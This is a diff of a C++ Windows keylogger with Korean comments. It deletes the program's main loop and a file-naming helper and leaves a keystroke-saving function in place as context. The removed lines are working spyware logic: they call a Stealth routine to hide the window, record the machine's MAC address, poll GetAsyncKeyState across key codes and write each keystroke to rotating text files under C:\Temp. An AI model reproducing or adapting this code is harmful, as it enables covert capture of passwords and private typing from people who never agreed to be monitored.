@@ -14,20 +14,7 @@ using namespace std;
 int Save(int key_stroke, char *file);
 void Stealth();
 
-void file_name(char *old, int cnt)//file이름 설정
-{
-	int i;
-	char *txt = ".txt";
-	char file_num[2] = "a";
-	char *p;
-	p = &file_num[0];
-	for (i = 0; i < cnt; i++)
-	{
-		(*p)++;
-	}
-	strcat(old, file_num);
-	strcat(old, txt);
-}
+
 void user_Address()//mac_address 불러오는 함수
 {
 	char strMac[256];
@@ -52,41 +39,7 @@ void user_Address()//mac_address 불러오는 함수
 	fclose(OUTPUT_FILE);
 }
 
-int main()
-{
 
-	char i;
-	int cnt = 0, j = 0;
-	char oldstr[500] = "C:\\Temp\\a";
-
-
-	Stealth();
-	user_Address();
-	while (1)
-	{
-		for (i = 8; i <= 190; i++)
-		{
-			if (GetAsyncKeyState(i) == -32767) {
-				if (cnt > 25) {
-					cnt = 0;
-				}
-				file_name(oldstr, cnt);
-				Save(i, oldstr);
-
-				if (j >= 30) {
-					cnt++;
-					j = 0;
-				}
-				else
-					j++;
-				strcpy(oldstr, "C:\\Temp\\a");
-			}
-		}
-
-	}
-	system("PAUSE");
-	return 0;
-}
 int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
 {
 	if ((key_stroke == 1) || (key_stroke == 2))
